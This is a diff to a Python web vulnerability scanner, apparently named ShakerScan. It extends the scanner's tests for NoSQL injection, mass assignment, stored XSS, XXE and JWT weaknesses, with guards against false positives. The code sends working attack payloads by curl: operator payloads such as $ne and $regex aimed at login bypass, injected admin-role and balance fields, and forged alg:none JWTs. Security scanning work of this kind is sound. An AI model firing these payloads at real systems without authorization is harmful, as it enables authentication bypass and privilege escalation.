+            "user", "username", "author", "createdat", "updatedat", "name",
+            "title", "description",
+        }
+        has_data_shape = (
+            p_items >= 2
+            and int(permissive_stats["object_key_count"]) >= 2
+            and bool(p_keys.intersection(data_key_markers) or len(p_keys) >= 3)
+        )
+        if not has_data_shape:
+            return None
+
+        control_rejected = control_status in (400, 401, 403, 404, 422)
+        expanded_items = p_items >= max(2, c_items + 2)
+        expanded_bytes = len(permissive_body or "") >= len(control_body or "") + 120
+        if not control_rejected and expanded_items and expanded_bytes:
+            # Reproducibility guard (see _query_collection_diff_evidence): an expansion delta
+            # is only injection if the control is stable across two samples; a volatile
+            # collection can fake it. Require a matching second control and clearance of it.
+            if control2_body is None:
+                return None
+            control2_stats = _json_collection_stats(control2_body)
+            c2_items = int(control2_stats["max_array_items"])
+            controls_stable = (
+                control2_status == control_status
+                and c2_items <= c_items + 1
+                and abs(len(control2_body or "") - len(control_body or "")) < 120
+                and p_items >= max(2, c2_items + 2)
+                and len(permissive_body or "") >= len(control2_body or "") + 120
+            )
+            if not controls_stable:
+                return None
+        if control_rejected or (expanded_items and expanded_bytes):
+            return {
+                "control_status": control_status,
+                "payload_status": permissive_status,
+                "control_items": c_items,
+                "payload_items": p_items,
+                "control_length": len(control_body or ""),
+                "payload_length": len(permissive_body or ""),
+            }
+        return None
 
     # NoSQLi payloads for JSON body injection
     nosql_payloads = [
@@ -2125,12 +2910,123 @@ async def nosql_injection_test_json_body(
         if not _has_nested_key(base_body, name):
             _set_nested_value(base_body, name, _fallback_value_for_param(name), overwrite=False)
 
+    async def _retry_after_validation(
+        request_body: dict[str, Any],
+        response_body: str,
+        response_code: int | None,
+    ) -> tuple[str, int | None, bool]:
+        if response_code not in (400, 422):
+            return response_body, response_code, True
+        missing_fields = _extract_missing_validation_fields(response_body)
+        added_fields = _add_validation_fields_to_body(base_body, missing_fields, "application/json")
+        if not added_fields:
+            return response_body, response_code, False
+        _add_validation_fields_to_body(request_body, added_fields, "application/json")
+        results["validation_fields_added"].append({
+            "url": url,
+            "method": method,
+            "fields": added_fields,
+        })
+        if attempt is not None:
+            attempt["validation_fields_added"] = list(dict.fromkeys(
+                [*(attempt.get("validation_fields_added") or []), *added_fields]
+            ))
+        retry_cmd = [
+            "curl", "-sS", "-X", method, "-L", "-k", "--max-time", "10",
+            "-H", "Content-Type: application/json",
+            "-d", json.dumps(request_body),
+            "-w", "__SHAKERSCAN_NOSQL__%{http_code}__SHAKERSCAN_NOSQL__",
+        ] + auth_args + [url]
+        retry_raw, _, retry_rc = await run(retry_cmd, timeout=15)
+        if retry_rc != 0:
+            return response_body, response_code, False
+        retry_body, retry_code = _parse_meta(retry_raw or "")
+        return retry_body, retry_code, retry_code not in (400, 422)
+
     if debug_nosql:
         print(f"[DEBUG NoSQL Test] url={url} method={method} params={params}", file=sys.stderr)
         print(f"[DEBUG NoSQL Test] base_body={base_body}", file=sys.stderr)
 
+    identity_params = [p for p in params if _is_identity_param(p)]
+    secret_params = [p for p in params if _is_secret_param(p)]
+    if identity_params and secret_params:
+        identity_param = identity_params[0]
+        secret_param = secret_params[0]
+        _mark_attempted([identity_param, secret_param])
+        baseline_payload = copy.deepcopy(base_body)
+        _set_nested_value(baseline_payload, identity_param, _fallback_value_for_param(identity_param), overwrite=True)
+        _set_nested_value(baseline_payload, secret_param, "shakerscan_invalid_password_12345", overwrite=True)
+        baseline_body = json.dumps(baseline_payload)
+        baseline_cmd = [
+            "curl", "-sS", "-X", method, "-L", "-k", "--max-time", "10",
+            "-H", "Content-Type: application/json",
+            "-d", baseline_body,
+            "-w", "__SHAKERSCAN_NOSQL__%{http_code}__SHAKERSCAN_NOSQL__",
+        ] + auth_args + [url]
+        baseline_raw, _, baseline_rc = await run(baseline_cmd, timeout=15)
+        baseline_out, baseline_code = _parse_meta(baseline_raw or "")
+        baseline_valid = baseline_rc == 0
+        if baseline_valid:
+            baseline_out, baseline_code, baseline_valid = await _retry_after_validation(
+                baseline_payload,
+                baseline_out,
+                baseline_code,
+            )
+        if baseline_valid:
+            _mark_completed([identity_param, secret_param])
+        if baseline_valid and baseline_code in (405, 415, 501):
+            results["skipped"] = True
+            results["reason"] = "method_or_content_type_not_supported"
+            results["baseline_status"] = baseline_code
+            _finalize_attempt(skipped_reason="method_or_content_type_not_supported")
+            return results
+
+        if baseline_valid and _is_auth_failure(baseline_code, baseline_out):
+            combo_payloads = [
+                {"$ne": None},
+                {"$ne": ""},
+                {"$gt": ""},
+                {"$regex": ".*"},
+            ]
+            for payload in combo_payloads:
+                test_payload = copy.deepcopy(base_body)
+                _set_nested_value(test_payload, identity_param, payload, overwrite=True)
+                _set_nested_value(test_payload, secret_param, payload, overwrite=True)
+                test_body = json.dumps(test_payload)
+                test_cmd = [
+                    "curl", "-sS", "-X", method, "-L", "-k", "--max-time", "10",
+                    "-H", "Content-Type: application/json",
+                    "-d", test_body,
+                    "-w", "__SHAKERSCAN_NOSQL__%{http_code}__SHAKERSCAN_NOSQL__",
+                ] + auth_args + [url]
+                test_raw, _, test_rc = await run(test_cmd, timeout=15)
+                if test_rc != 0:
+                    continue
+                test_out, test_code = _parse_meta(test_raw or "")
+                if test_code in (405, 415, 501):
+                    continue
+                if test_out and ("<!DOCTYPE" in test_out[:200] or "<html" in test_out[:200].lower()):
+                    continue
+                success_signals = _auth_success_signals(test_out)
+                if test_code is not None and test_code < 400 and len(success_signals) >= 2:
+                    results["vulnerable"] = True
+                    results["findings"].append({
+                        "parameter": f"{identity_param},{secret_param}",
+                        "payload": json.dumps({identity_param: payload, secret_param: payload}),
+                        "evidence_type": "credential_operator_bypass",
+                        "baseline_status": baseline_code,
+                        "payload_status": test_code,
+                        "success_signals": success_signals,
+                        "baseline_length": len(baseline_out or ""),
+                        "payload_length": len(test_out or ""),
+                        "response_snippet": test_out[:500] if test_out else "",
+                    })
+                    _finalize_attempt()
+                    return results
+
     for param in params[:5]:  # Limit to first 5 params
         results["params_tested"] += 1
+        _mark_attempted([param])
 
         # Baseline: send normal request with safe value
         baseline_payload = copy.deepcopy(base_body)
@@ -2144,19 +3040,49 @@ async def nosql_injection_test_json_body(
         ] + auth_args + [url]
         baseline_raw, _, baseline_rc = await run(baseline_cmd, timeout=15)
         baseline_out, baseline_code = _parse_meta(baseline_raw or "")
+        baseline_valid = baseline_rc == 0
+        if baseline_valid:
+            baseline_out, baseline_code, baseline_valid = await _retry_after_validation(
+                baseline_payload,
+                baseline_out,
+                baseline_code,
+            )
         baseline_len = len(baseline_out) if baseline_out else 0
         if debug_nosql:
             print(f"[DEBUG NoSQL Test] param={param} baseline_body={baseline_body}", file=sys.stderr)
             print(f"[DEBUG NoSQL Test] baseline_out={baseline_out[:200] if baseline_out else 'None'}...", file=sys.stderr)
             print(f"[DEBUG NoSQL Test] baseline_len={baseline_len}", file=sys.stderr)
 
-        if baseline_rc != 0:
+        if not baseline_valid:
             continue
+        _mark_completed([param])
         if baseline_code in (405, 415, 501):
             results["skipped"] = True
             results["reason"] = "method_or_content_type_not_supported"
             results["baseline_status"] = baseline_code
+            _finalize_attempt(skipped_reason="method_or_content_type_not_supported")
             return results
+
+        restrictive_out = baseline_out
+        restrictive_code = baseline_code
+        restrictive_payload = copy.deepcopy(base_body)
+        _set_nested_value(restrictive_payload, param, {"$eq": "shakerscan_nx_8f3a2e"}, overwrite=True)
+        restrictive_cmd = [
+            "curl", "-sS", "-X", method, "-L", "-k", "--max-time", "10",
+            "-H", "Content-Type: application/json",
+            "-d", json.dumps(restrictive_payload),
+            "-w", "__SHAKERSCAN_NOSQL__%{http_code}__SHAKERSCAN_NOSQL__",
+        ] + auth_args + [url]
+        restrictive_raw, _, restrictive_rc = await run(restrictive_cmd, timeout=15)
+        if restrictive_rc == 0:
+            restrictive_out, restrictive_code = _parse_meta(restrictive_raw or "")
+        # Second restrictive (control) sample for the reproducibility guard: detects a
+        # volatile collection so a jitter delta is not scored as operator injection.
+        restrictive2_out = None
+        restrictive2_code = None
+        restrictive2_raw, _, restrictive2_rc = await run(restrictive_cmd, timeout=15)
+        if restrictive2_rc == 0:
+            restrictive2_out, restrictive2_code = _parse_meta(restrictive2_raw or "")
 
         # Test each NoSQLi payload
         for payload in nosql_payloads:
@@ -2222,6 +3148,7 @@ async def nosql_injection_test_json_body(
             # Check for behavioral differences
             is_vulnerable = False
             evidence_type = ""
+            collection_evidence = None
 
             # Pre-compute success/error indicators
             error_markers = [
@@ -2233,9 +3160,29 @@ async def nosql_injection_test_json_body(
             baseline_is_error = (baseline_code is not None and baseline_code >= 400) or any(m in baseline_lower for m in error_markers)
             test_is_success = (test_code is not None and test_code < 400) and not any(m in test_lower for m in error_markers)
 
+            if isinstance(payload, dict) and ("$ne" in payload or "$regex" in payload or "$exists" in payload):
+                collection_evidence = _collection_diff_evidence(
+                    restrictive_out or baseline_out or "",
+                    test_out or "",
+                    control_status=restrictive_code,
+                    permissive_status=test_code,
+                    control2_body=restrictive2_out,
+                    control2_status=restrictive2_code,
+                )
+                if collection_evidence:
+                    is_vulnerable = True
+                    evidence_type = "operator_collection_differential"
+                    if debug_nosql:
+                        print(
+                            "[DEBUG NoSQL Test] COLLECTION DIFFERENTIAL DETECTED: "
+                            f"control_items={collection_evidence['control_items']} "
+                            f"payload_items={collection_evidence['payload_items']}",
+                            file=sys.stderr,
+                        )
+
             # Significant length difference (use lower threshold for small baselines)
             min_diff = min(100, max(20, baseline_len * 2))
-            if baseline_is_error and test_is_success and test_len > baseline_len * 1.5 and test_len > baseline_len + min_diff:
+            if not is_vulnerable and baseline_is_error and test_is_success and test_len > baseline_len * 1.5 and test_len > baseline_len + min_diff:
                 is_vulnerable = True
                 evidence_type = "length_difference"
                 if debug_nosql:
@@ -2243,7 +3190,7 @@ async def nosql_injection_test_json_body(
 
             # Empty/minimal baseline with substantial response (catches {} -> data)
             baseline_minimal = baseline_len <= 10 or baseline_out in ('{}', '[]', 'null', '')
-            if baseline_minimal and test_len > 30 and test_is_success:
+            if not is_vulnerable and baseline_minimal and test_len > 30 and test_is_success:
                 is_vulnerable = True
                 evidence_type = "empty_baseline_bypass"
                 if debug_nosql:
@@ -2257,7 +3204,7 @@ async def nosql_injection_test_json_body(
                 if debug_nosql and payload == nosql_payloads[0]:
                     print(f"[DEBUG NoSQL Test] baseline_looks_error={baseline_looks_error} test_looks_success={test_is_success}", file=sys.stderr)
 
-                if baseline_looks_error and test_is_success and test_len > 50:
+                if not is_vulnerable and baseline_looks_error and test_is_success and test_len > 50:
                     is_vulnerable = True
                     evidence_type = "bypass_error"
                     if debug_nosql:
@@ -2267,24 +3214,266 @@ async def nosql_injection_test_json_body(
             data_indicators = ['"id"', '"_id"', '"email"', '"user', '"token"', '"coupon"', '"code"', '"amount"']
             test_has_data = any(x in test_out.lower() for x in data_indicators) if test_out else False
             baseline_has_data = any(x in (baseline_out or "").lower() for x in data_indicators)
-            if test_has_data and not baseline_has_data and test_is_success:
+            if not is_vulnerable and test_has_data and not baseline_has_data and test_is_success:
                 is_vulnerable = True
                 evidence_type = "data_leak"
                 if debug_nosql:
                     print(f"[DEBUG NoSQL Test] DATA LEAK DETECTED!", file=sys.stderr)
 
             if is_vulnerable:
-                results["vulnerable"] = True
-                results["findings"].append({
+                finding = {
                     "parameter": param,
                     "payload": json.dumps(payload),
                     "evidence_type": evidence_type,
                     "baseline_length": baseline_len,
                     "payload_length": test_len,
                     "response_snippet": test_out[:500] if test_out else "",
-                })
+                }
+                if collection_evidence:
+                    finding.update(collection_evidence)
+                results["vulnerable"] = True
+                results["findings"].append(finding)
                 break  # Found vuln for this param, move to next
 
+    _finalize_attempt()
+    return results
+
+
+async def mass_assignment_test_json_body(
+    url: str,
+    method: str = "POST",
+    params: list[str] | None = None,
+    auth_session: Any | None = None,
+    body_template: dict[str, Any] | None = None,
+    body_param_defaults: dict[str, Any] | None = None,
+    content_type: str = "application/json",
+    max_fields: int = 8,
+) -> dict[str, Any]:
+    """Test discovered JSON endpoints for strict mass-assignment acceptance.
+
+    This is intentionally proof-oriented: it only reports when the response is
+    successful JSON and reflects the injected privileged field/value while the
+    baseline response did not already expose that same value.
+    """
+    results: dict[str, Any] = {
+        "vulnerable": False,
+        "findings": [],
+        "fields_tested": 0,
+        "url": url,
+        "method": method,
+    }
+    dangerous_fields: list[tuple[str, Any, str]] = [
+        ("role", "admin", "role_escalation"),
+        ("user_role", "admin", "role_escalation"),
+        ("userType", "admin", "role_escalation"),
+        ("isAdmin", True, "admin_flags"),
+        ("is_admin", True, "admin_flags"),
+        ("admin", True, "admin_flags"),
+        ("isVerified", True, "account_status"),
+        ("verified", True, "account_status"),
+        ("balance", 1000000, "business_logic"),
+        ("discount", 100, "business_logic"),
+    ]
+    parsed_url = urllib.parse.urlparse(url)
+    endpoint_path = parsed_url.path or "/"
+    custom_endpoint = f"{method.upper()} {endpoint_path}"
+    if parsed_url.query:
+        custom_endpoint = f"{custom_endpoint}?{parsed_url.query}"
+    attempt: dict[str, Any] = {
+        "custom_endpoint": custom_endpoint,
+        "family": "mass_assignment",
+        "method": method.upper(),
+        "url": url,
+        "param_count": min(max(1, int(max_fields or 1)), len(dangerous_fields)),
+        "param_names": [name for name, _, _ in dangerous_fields[: min(max(1, int(max_fields or 1)), len(dangerous_fields))]],
+        "param_location": "body",
+        "attempted_params_count": 0,
+        "completed_params_count": 0,
+        "status": "started",
+    }
+    results["endpoint_attempts"] = [attempt]
+    if "json" not in (content_type or "").lower():
+        results["skipped"] = True
+        results["reason"] = "non_json_content_type"
+        attempt["status"] = "skipped"
+        attempt["skip_reason"] = "non_json_content_type"
+        return results
+
+    params = params or []
+    base_body: dict[str, Any] = {}
+    if isinstance(body_template, dict):
+        base_body = copy.deepcopy(body_template)
+    for name, value in (body_param_defaults or {}).items():
+        if not _has_nested_key(base_body, name):
+            _set_nested_value(base_body, name, value, overwrite=False)
+    for name in params[:12]:
+        if not _has_nested_key(base_body, name):
+            _set_nested_value(base_body, name, _fallback_value_for_param(name), overwrite=False)
+    if "json" in (content_type or "").lower() and base_body:
+        attempt["custom_endpoint"] = (
+            f"{method.upper()} {endpoint_path} json:"
+            + json.dumps(base_body, separators=(",", ":"))
+        )
+
+    rejection_markers = (
+        "not allowed", "forbidden", "unknown field", "invalid field",
+        "unexpected", "cannot set", "read only", "readonly", "not permitted",
+    )
+
+    def _parse_meta(raw: str) -> tuple[str, int | None]:
+        marker_pattern = re.compile(r"__SHAKERSCAN_MASS_ASSIGN__(\d{3})__SHAKERSCAN_MASS_ASSIGN__$")
+        if not raw:
+            return raw or "", None
+        match = marker_pattern.search(raw.strip())
+        if not match:
+            return raw, None
+        return raw[: match.start()], int(match.group(1))
+
+    def _norm_key(name: str) -> str:
+        return re.sub(r"[^a-z0-9]", "", name.lower())
+
+    def _values_equal(observed: Any, expected: Any) -> bool:
+        if isinstance(expected, bool):
+            return observed is expected or str(observed).lower() == str(expected).lower()
+        if isinstance(expected, (int, float)):
+            try:
+                return float(observed) == float(expected)
+            except (TypeError, ValueError):
+                return False
+        return str(observed).lower() == str(expected).lower()
+
+    def _json_privilege_signal(body: str, field: str, expected: Any, category: str) -> dict[str, Any] | None:
+        if not body:
+            return None
+        try:
+            parsed = json.loads(body)
+        except Exception:
+            return None
+        target = _norm_key(field)
+        admin_tokens = {"admin", "administrator", "superuser", "root"}
+        role_keys = {
+            "role", "roles", "userrole", "usertype", "accounttype",
+            "permission", "permissions", "authority", "authorities",
+            "scope", "scopes", "group", "groups",
+        }
+        admin_flag_keys = {
+            "admin", "isadmin", "administrator", "superuser", "root",
+        }
+        status_keys = {"verified", "isverified", "emailverified", "accountverified"}
+
+        def _contains_admin_token(value: Any) -> bool:
+            if isinstance(value, list):
+                return any(_contains_admin_token(item) for item in value[:20])
+            if isinstance(value, dict):
+                return any(_contains_admin_token(child) for child in value.values())
+            tokens = [
+                token for token in re.split(r"[\s,;|:/]+", str(value).lower())
+                if token
+            ]
+            return any(token in admin_tokens for token in tokens)
+
+        def _walk(value: Any, path: str = "$") -> dict[str, Any] | None:
+            if isinstance(value, dict):
+                for key, child in value.items():
+                    norm = _norm_key(str(key))
+                    child_path = f"{path}.{key}"
+                    if norm == target and _values_equal(child, expected):
+                        return {"path": child_path, "match_type": "exact_field"}
+                    if category == "role_escalation" and norm in role_keys and _contains_admin_token(child):
+                        return {"path": child_path, "match_type": "equivalent_admin_role"}
+                    if category == "admin_flags":
+                        if norm in admin_flag_keys and _values_equal(child, True):
+                            return {"path": child_path, "match_type": "equivalent_admin_flag"}
+                        if norm in role_keys and _contains_admin_token(child):
+                            return {"path": child_path, "match_type": "equivalent_admin_role"}
+                    if category == "account_status" and norm in status_keys and _values_equal(child, True):
+                        return {"path": child_path, "match_type": "equivalent_account_status"}
+                    nested = _walk(child, child_path)
+                    if nested:
+                        return nested
+            elif isinstance(value, list):
+                for idx, child in enumerate(value[:10]):
+                    nested = _walk(child, f"{path}[{idx}]")
+                    if nested:
+                        return nested
+            return None
+
+        return _walk(parsed)
+
+    auth_args = _filter_curl_headers(get_auth_curl_args(auth_session), {"content-type"})
+    baseline_body_args, baseline_header_args = _build_curl_body_args(base_body, content_type)
+    baseline_cmd = [
+        "curl", "-sS", "-X", method, "-L", "-k", "--max-time", "10",
+    ] + baseline_header_args + auth_args + baseline_body_args + [
+        "-w", "__SHAKERSCAN_MASS_ASSIGN__%{http_code}__SHAKERSCAN_MASS_ASSIGN__",
+        url,
+    ]
+    baseline_raw, _, baseline_rc = await run(baseline_cmd, timeout=15)
+    baseline_out, baseline_status = _parse_meta(baseline_raw or "")
+    if baseline_rc != 0:
+        results["skipped"] = True
+        results["reason"] = "baseline_request_failed"
+        attempt["status"] = "partial"
+        attempt["skip_reason"] = "baseline_request_failed"
+        return results
+    if baseline_status in (405, 415, 501):
+        results["skipped"] = True
+        results["reason"] = "method_or_content_type_not_supported"
+        results["baseline_status"] = baseline_status
+        attempt["status"] = "skipped"
+        attempt["skip_reason"] = "method_or_content_type_not_supported"
+        return results
+
+    for field, value, category in dangerous_fields[:max(1, max_fields)]:
+        results["fields_tested"] += 1
+        attempt["attempted_params_count"] += 1
+        test_body = copy.deepcopy(base_body)
+        _set_nested_value(test_body, field, value, overwrite=True)
+        test_body_args, test_header_args = _build_curl_body_args(test_body, content_type)
+        test_cmd = [
+            "curl", "-sS", "-X", method, "-L", "-k", "--max-time", "10",
+        ] + test_header_args + auth_args + test_body_args + [
+            "-w", "__SHAKERSCAN_MASS_ASSIGN__%{http_code}__SHAKERSCAN_MASS_ASSIGN__",
+            url,
+        ]
+        test_raw, _, test_rc = await run(test_cmd, timeout=15)
+        if test_rc != 0:
+            continue
+        attempt["completed_params_count"] += 1
+        test_out, test_status = _parse_meta(test_raw or "")
+        test_lower = (test_out or "").lower()
+        if test_status is None or test_status >= 300:
+            continue
+        if any(marker in test_lower for marker in rejection_markers):
+            continue
+        signal = _json_privilege_signal(test_out, field, value, category)
+        if not signal:
+            continue
+        if _json_privilege_signal(baseline_out, field, value, category):
+            continue
+
+        results["vulnerable"] = True
+        results["findings"].append({
+            "parameter": field,
+            "value": value,
+            "category": category,
+            "baseline_status": baseline_status,
+            "payload_status": test_status,
+            "evidence_type": (
+                "privileged_field_reflected"
+                if signal.get("match_type") == "exact_field"
+                else "privileged_effect_observed"
+            ),
+            "observed_path": signal.get("path"),
+            "observed_match_type": signal.get("match_type"),
+            "response_snippet": test_out[:500] if test_out else "",
+        })
+
+    attempt["status"] = (
+        "completed"
+        if int(attempt.get("completed_params_count") or 0) >= int(attempt.get("attempted_params_count") or 0)
+        else "partial"
+    )
     return results
 
 
@@ -2556,11 +3745,7 @@ async def ssti_test(
     payloads_seen: set[str] = set()
 
     def _clean_template_response(content: str) -> str:
-        clean = re.sub(r'<!--.*?-->', '', content or "", flags=re.DOTALL)
-        clean = re.sub(r'<script.*?</script>', '', clean, flags=re.DOTALL | re.IGNORECASE)
-        clean = re.sub(r'<style.*?</style>', '', clean, flags=re.DOTALL | re.IGNORECASE)
-        clean = re.sub(r'<[^>]+>', ' ', clean)
-        return re.sub(r'\s+', ' ', clean)
+        return _visible_html_text(content)
 
     def _looks_like_generic_html_shell(content: str) -> bool:
         sample = (content or "")[:2000].lower()
@@ -2908,6 +4093,22 @@ async def xxe_injection_test_json_body(
         html_indicators = ["<!doctype", "<html", "<head>", "<body>", "<script", "<title>"]
         return sum(1 for ind in html_indicators if ind in content_lower) >= 2
 
+    def _strip_reflected_payload(content: str, payload: str) -> str:
+        """Remove echoed payload forms before checking for XXE success markers."""
+        variants = {payload}
+        try:
+            variants.add(json.dumps(payload)[1:-1])
+        except Exception:
+            pass
+        variants.add(payload.replace('"', r'\"'))
+        variants.add(urllib.parse.quote(payload, safe=""))
+        variants.add(urllib.parse.quote_plus(payload))
+
+        scrubbed = content
+        for variant in sorted((v for v in variants if v), key=len, reverse=True):
+            scrubbed = scrubbed.replace(variant, "")
+        return scrubbed
+
     auth_args = _filter_curl_headers(get_auth_curl_args(auth_session), {"content-type"})
     base_body = _build_body_template({"body_template": body_template}) if body_template is not None else {}
     if isinstance(base_body, dict) and body_param_defaults:
@@ -2933,9 +4134,11 @@ async def xxe_injection_test_json_body(
             if rc == 0 and out:
                 if _is_html_response(out):
                     continue
-                has_file = any(ind in out for ind in file_indicators)
-                has_ssrf = any(ind in out for ind in ssrf_indicators)
-                has_error = any(re.search(pat, out, re.IGNORECASE) for pat in error_patterns)
+                signal_body = _strip_reflected_payload(out, payload)
+                payload_reflected = signal_body != out
+                has_file = any(ind in signal_body for ind in file_indicators)
+                has_ssrf = any(ind in signal_body for ind in ssrf_indicators)
+                has_error = any(re.search(pat, signal_body, re.IGNORECASE) for pat in error_patterns)
                 if (has_file or has_ssrf or has_error):
                     results["vulnerable"] = True
                     results["findings"].append({
@@ -2943,6 +4146,7 @@ async def xxe_injection_test_json_body(
                         "payload": payload[:120],
                         "url": url,
                         "method": method,
+                        "payload_reflected": payload_reflected,
                         "response_snippet": out[:500],
                     })
                     break
@@ -3009,6 +4213,7 @@ async def stored_xss_workflow(
     pages_to_check = (priority + remaining)[:max_pages]
 
     auth_args = _filter_curl_headers(get_auth_curl_args(auth_session), {"content-type"})
+    request_headers = _headers_from_curl_args(auth_args)
 
     def _coerce_param_list(raw: Any) -> list[str]:
         if isinstance(raw, dict):
@@ -3079,8 +4284,40 @@ async def stored_xss_workflow(
                     payload_reflected = payload in page_out
                     idx = page_out.find(marker)
                     snippet = page_out[max(0, idx - 80): idx + 120] if idx >= 0 else page_out[:200]
-                    results["vulnerable"] = True
-                    results["findings"].append({
+                    verified = False
+                    proof_data = None
+                    confidence = 0.55
+                    severity = "medium"
+                    evidence_notes = [
+                        "Stored marker rendered after payload submission",
+                    ]
+                    if payload_reflected:
+                        confidence = 0.65
+                        evidence_notes.append("Submitted payload rendered in the stored page response")
+
+                    if payload_reflected and HAS_XSS_PROOF and prove_xss_headless:
+                        try:
+                            proof = await prove_xss_headless(
+                                url=page_url,
+                                param=f"stored:{param}",
+                                payload=payload,
+                                prebuilt_url=page_url,
+                                headers=request_headers or None,
+                            )
+                            if proof and proof.proven:
+                                verified = True
+                                severity = "high"
+                                confidence = proof.confidence
+                                evidence_notes.append(f"Browser proof: {proof.technique}")
+                                if proof.extracted_data:
+                                    evidence_notes.append(f"Proof data: {proof.extracted_data}")
+                                proof_data = proof.to_dict()
+                            else:
+                                evidence_notes.append("Browser verification attempted but no execution confirmed")
+                        except Exception as e:
+                            evidence_notes.append(f"Browser verification skipped: {e}")
+
+                    finding = {
                         "injection_url": url,
                         "stored_url": page_url,
                         "param": param,
@@ -3088,13 +4325,42 @@ async def stored_xss_workflow(
                         "payload_reflected": payload_reflected,
                         "snippet": snippet,
                         "method": method,
-                        "severity": "high" if payload_reflected else "medium",
-                    })
+                        "severity": severity,
+                        "confidence": confidence,
+                        "verified": verified,
+                        "proof_state": "exploited" if verified else "likely_vulnerable",
+                        "evidence": evidence_notes,
+                    }
+                    if verified:
+                        finding["cvss_score"] = 7.4
+                        finding["poe_result"] = {"proven": True, "confidence": confidence}
+                    if proof_data:
+                        finding["browser_proof"] = proof_data
+                    if request_headers:
+                        finding["request_headers"] = request_headers
+                    if payload_reflected or verified:
+                        # Raw (unescaped) reflection or a browser-confirmed execution is a
+                        # stored-XSS finding.
+                        results["vulnerable"] = True
+                        results["findings"].append(finding)
+                        results["evidence"].append({
+                            "stored_url": page_url,
+                            "snippet": snippet,
+                            "payload_reflected": payload_reflected,
+                            "verified": verified,
+                            "proof_state": finding["proof_state"],
+                        })
+                        break
+                    # Marker present but the payload was rendered SAFELY ESCAPED (the secure
+                    # behavior): stored, not executable. Record evidence only — never a
+                    # finding — and keep probing other payloads.
                     results["evidence"].append({
                         "stored_url": page_url,
                         "snippet": snippet,
+                        "payload_reflected": False,
+                        "verified": False,
+                        "note": "stored input rendered safely escaped (marker rendered, payload not reflected) - no XSS finding",
                     })
-                    break
             if results["vulnerable"]:
                 break
         if results["vulnerable"]:
@@ -3103,23 +4369,81 @@ async def stored_xss_workflow(
     return results
 
 
-async def jwt_vulnerability_test(url: str, sample_token: str | None = None) -> dict[str, Any]:
+JWT_TOKEN_RE = re.compile(r"(eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*)")
+
+
+def _extract_jwt_from_text(value: Any) -> str | None:
+    if value is None:
+        return None
+    match = JWT_TOKEN_RE.search(str(value))
+    return match.group(1) if match else None
+
+
+def _jwt_token_from_auth_session(auth_session: Any | None = None) -> str | None:
+    """Return a configured JWT from auth headers/cookies without guessing credentials."""
+    if auth_session is None:
+        return None
+
+    try:
+        headers = dict(getattr(getattr(auth_session, "config", None), "headers", {}) or {})
+    except Exception:
+        headers = {}
+    for name, value in headers.items():
+        token = _extract_jwt_from_text(value)
+        if token and str(name).lower() in {
+            "authorization", "x-authorization", "x-auth-token", "x-access-token",
+            "x-jwt-token", "jwt", "access-token",
+        }:
+            return token
+    for value in headers.values():
+        token = _extract_jwt_from_text(value)
+        if token:
+            return token
+
+    cookies: dict[str, Any] = {}
+    try:
+        cookies.update(dict(getattr(getattr(auth_session, "config", None), "cookies", {}) or {}))
+    except Exception:
+        pass
+    try:
+        cookies.update(dict(getattr(getattr(auth_session, "state", None), "cookies_received", {}) or {}))
+    except Exception:
+        pass
+    preferred_cookie_names = {
+        "jwt", "token", "accesstoken", "authtoken", "idtoken",
+        "session", "sessionid",
+    }
+    for name, value in cookies.items():
+        token = _extract_jwt_from_text(value)
+        if token and re.sub(r"[^a-z0-9]", "", str(name).lower()) in preferred_cookie_names:
+            return token
+    for value in cookies.values():
+        token = _extract_jwt_from_text(value)
+        if token:
+            return token
+    return None
+
+
+async def jwt_vulnerability_test(
+    url: str,
+    sample_token: str | None = None,
+    auth_session: Any | None = None,
+) -> dict[str, Any]:
     results: dict[str, Any] = {"vulnerable": False, "issues": [], "evidence": []}
+    if not sample_token:
+        sample_token = _jwt_token_from_auth_session(auth_session)
     if not sample_token:
         for endpoint in ["/api/login", "/api/auth", "/login", "/auth/login"]:
             login_url = urllib.parse.urljoin(url, endpoint)
             out, err, rc = await run(["curl", "-sS", "-X", "POST", "-L", "-k", "-H", "Content-Type: application/json", "-d", '{"username":"test","password":"test"}', login_url], timeout=10)
             if rc == 0 and out:
-                m = re.search(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+', out)
-                if m:
-                    sample_token = m.group(0)
+                sample_token = _extract_jwt_from_text(out)
+                if sample_token:
                     break
     if not sample_token:
         out, err, rc = await run(["curl", "-sS", "-I", "-L", "-k", url], timeout=10)
         if rc == 0 and out:
-            m = re.search(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+', out)
-            if m:
-                sample_token = m.group(0)
+            sample_token = _extract_jwt_from_text(out)
     if sample_token:
         try:
             parts = sample_token.split('.')
@@ -3131,11 +4455,41 @@ async def jwt_vulnerability_test(url: str, sample_token: str | None = None) -> d
                 new_header = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=')
                 new_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=')
                 none_token = new_header.decode() + '.' + new_payload.decode() + '.'
-                test_out, test_err, test_rc = await run(["curl", "-sS", "-L", "-k", "-H", f"Authorization: Bearer {none_token}", url], timeout=10)
-                if test_rc == 0 and test_out and "401" not in test_out[:100] and "403" not in test_out[:100]:
+
+                async def _jwt_probe_status(token: str) -> int:
+                    """Return the real HTTP status for a Bearer-token request (0 on error).
+
+                    Uses %{http_code} instead of scanning the response body for "401"/"403":
+                    a body-substring check falsely fires on any page whose text happens to
+                    contain those digits and ignores the actual status code.
+                    """
+                    probe_out, _probe_err, probe_rc = await run(
+                        ["curl", "-sS", "-L", "-k", "-o", "/dev/null", "-w", "%{http_code}",
+                         "-H", f"Authorization: Bearer {token}", url],
+                        timeout=10,
+                    )
+                    if probe_rc != 0 or not probe_out:
+                        return 0
+                    try:
+                        return int(str(probe_out).strip()[-3:])
+                    except (TypeError, ValueError):
+                        return 0
+
+                none_status = await _jwt_probe_status(none_token)
+                # Differential guard: a deliberately-tampered signature on the original token
+                # must be REJECTED (401/403). If the endpoint 2xx's that too, it is not
+                # validating JWTs at all (public/no-auth), so alg:none "acceptance" is not a
+                # finding. This prevents the broad false positive on public roots.
+                tampered_status = await _jwt_probe_status(f"{parts[0]}.{parts[1]}.invalidsignature")
+                if 200 <= none_status < 300 and tampered_status in (401, 403):
                     results["vulnerable"] = True
                     results["issues"].append("none_algorithm")
-                    results["evidence"].append({"type": "none_algorithm", "description": "JWT accepts 'none' algorithm"})
+                    results["evidence"].append({
